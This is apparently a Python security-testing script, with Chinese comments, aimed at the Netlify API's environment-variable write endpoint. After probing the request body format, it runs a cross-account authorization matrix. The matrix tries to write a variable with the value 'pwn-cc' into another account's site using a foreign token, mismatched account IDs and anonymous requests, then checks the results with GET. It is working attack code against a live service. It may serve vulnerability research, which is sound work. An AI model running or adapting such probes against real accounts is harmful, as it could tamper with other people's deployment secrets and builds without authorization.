# -*- coding: utf-8 -*-
"""env 写接口: 结构学习(基线) + 跨账号越权矩阵
POST /api/v1/accounts/{acc}/env?site_id={site} + JSON body
"""
import http.client, ssl, gzip, brotli, json, sys, random
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ACC_A = '6a979dd2ae93f47d55b62897'
ACC_B = '6a97b6454fef0db964f75db6'
ctx = ssl.create_default_context()
K = 'T_E%s' % random.randint(1000, 9999)

def req(method, path, body=None, token=None, timeout=20):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

print('K =', K)

print('== 1. body 结构学习(B 写自己, 无副作用探针) ==')
bodies = [
    {'key': K, 'value': 'v1', 'context': 'production'},
    {'key': K, 'scopes': ['builds'], 'values': [{'context': 'production', 'value': 'v1'}]},
    [{'key': K, 'scopes': ['builds'], 'values': [{'context': 'production', 'value': 'v1'}]}],
    [{'key': K, 'values': [{'context': 'production', 'value': 'v1'}]}],
]
for bd in bodies:
    st, b = req('POST', '/api/v1/accounts/' + ACC_B + '/env?site_id=' + SITE_B, bd, TOKEN_B)
    print('%-90s -> %s | %s' % (json.dumps(bd)[:88], st, b[:150]))

print()
print('== 2. 写接口越权矩阵(全部试写同一个 key K2) ==')
K2 = 'T_E%s' % random.randint(1000, 9999)
body = [{'key': K2, 'scopes': ['builds'], 'values': [{'context': 'production', 'value': 'pwn-cc'}]}]
mx = [
    ('B tok accB siteB (基线)',   TOKEN_B, ACC_B, SITE_B),
    ('A tok accB siteB (跨账号写!)', TOKEN_A, ACC_B, SITE_B),
    ('A tok accA siteB (跨site写!)', TOKEN_A, ACC_A, SITE_B),
    ('B tok accA siteB (account 参数错配)', TOKEN_B, ACC_A, SITE_B),
    ('A tok accA siteA (A自己)',   TOKEN_A, ACC_A, SITE_A),
    ('anon accB siteB',           None,    ACC_B, SITE_B),
]
for tag, tok, acc, site in mx:
    st, b = req('POST', '/api/v1/accounts/%s/env?site_id=%s' % (acc, site), body, tok)
    print('%-32s -> %s | %s' % (tag, st, b[:200]))
    # 若 200 则 GET 验证归属
    if st in (200, 201):
        for p, t2 in [('/api/v1/sites/%s/env' % site, tok),
                      ('/api/v1/sites/%s/env' % site, TOKEN_A if tok != TOKEN_A else TOKEN_B)]:
            s2, b2 = req('GET', p, token=t2)
            print('      verify GET %s %s -> %s | %s' % (p[:30], t2[:20], s2, b2[:200]))
print('done')
